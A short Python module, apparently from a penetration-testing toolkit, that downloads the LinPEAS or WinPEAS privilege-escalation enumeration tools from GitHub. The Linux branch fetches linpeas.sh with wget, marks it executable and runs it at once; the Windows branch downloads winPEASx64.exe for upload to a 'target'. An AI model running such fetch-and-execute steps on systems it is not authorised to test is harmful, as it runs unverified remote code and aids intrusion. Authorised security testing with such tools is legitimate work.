import subprocess

def run():
    print("[*] Running privilege escalation module...")

    choice = input("Run Linux or Windows PE? (linux/windows): ").strip().lower()
    
    if choice == "linux":
        print("[*] Running LinPEAS for Linux Privilege Escalation...")
        subprocess.run(["wget", "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"])
        subprocess.run(["chmod", "+x", "linpeas.sh"])
        subprocess.run(["./linpeas.sh"])
    
    elif choice == "windows":
        print("[*] Running WinPEAS for Windows Privilege Escalation...")
        subprocess.run(["wget", "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe"])
        print("[+] Upload winPEASx64.exe to target and execute manually.")

    else:
        print("[-] Invalid choice.")

    print("[+] Privilege Escalation module completed.")
